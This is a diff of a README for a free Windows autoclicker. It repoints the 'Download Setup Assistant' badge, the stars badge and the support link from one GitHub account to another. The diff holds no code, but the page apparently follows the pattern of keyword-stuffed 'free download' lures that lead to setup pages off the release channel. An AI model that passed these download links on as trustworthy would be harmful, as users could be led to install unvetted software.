@@ -7,10 +7,10 @@ keywords: autoclicker for windows, mouse automation tool, free clicker download,
 
 # 🖱️ AutoClicker for Windows — The Ultimate Mouse Automation Tool
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://autoclicker-pro-free.github.io/.github)
+[![Download Setup](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://robertnotdeniro.github.io/autoclicker-windows-offline-setup-guide)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Windows](https://img.shields.io/badge/Windows-7%20|%208%20|%2010%20|%2011-blue)](https://www.microsoft.com/windows)
-[![GitHub stars](https://img.shields.io/github/stars/Autoclicker-Pro-Free/autoclicker-windows-offline-setup-guide)](https://github.com/Autoclicker-Pro-Free/autoclicker-windows-offline-setup-guide/stargazers)
+[![GitHub stars](https://img.shields.io/github/stars/robertnotdeniro/autoclicker-windows-offline-setup-guide)](https://github.com/robertnotdeniro/autoclicker-windows-offline-setup-guide/stargazers)
 
 ## 🚀 Why Choose Our AutoClicker?
 
@@ -110,7 +110,7 @@ A: Verify the click position is correct and the target window is active.
 
 ## 🤝 Community & Support
 
-- **GitHub**: [Report issues and contribute](https://github.com/Autoclicker-Pro-Free/autoclicker-windows-offline-setup-guide)
+- **GitHub**: [Report issues and contribute](https://github.com/robertnotdeniro/autoclicker-windows-offline-setup-guide)
 - **Discussions**: Share tips and get help from the community
 - **Updates**: Check for new versions and features
 
